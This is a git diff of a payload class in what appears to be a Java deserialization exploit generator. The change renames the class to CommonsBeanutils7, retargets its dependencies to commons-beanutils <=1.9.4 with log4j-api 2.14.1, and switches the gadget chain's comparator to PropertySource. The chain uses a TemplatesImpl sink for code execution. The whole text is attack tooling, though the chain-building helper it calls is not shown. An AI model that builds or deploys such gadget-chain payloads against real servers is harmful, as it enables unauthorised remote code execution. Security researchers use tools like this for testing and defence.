@@ -10,14 +10,16 @@ import com.ppp.sinks.annotation.Sink;
 
 /**
  * @author Whoopsunix
+ *
+ * CommonsBeanutilsPropertySource
  */
-@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4", "org.apache.commons:commons-lang3"})
-@Authors({Authors.DROPLET})
+@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4", "org.apache.logging.log4j:log4j-api:2.14.1"})
+@Authors({Authors.SummerSec})
 @Sink({Sink.TemplatesImpl})
-public class CommonsBeanutilsObjectToStringComparator implements ObjectPayload<Object> {
+public class CommonsBeanutils7 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsBeanutilsObjectToStringComparator.class, args);
+        PayloadRunner.run(CommonsBeanutils7.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
@@ -30,6 +32,6 @@ public class CommonsBeanutilsObjectToStringComparator implements ObjectPayload<O
     }
 
     public Object getChain(Object templates, String version) throws Exception {
-        return BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.ObjectToStringComparator, templates, version);
+        return BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.PropertySource, templates, version);
     }
 }
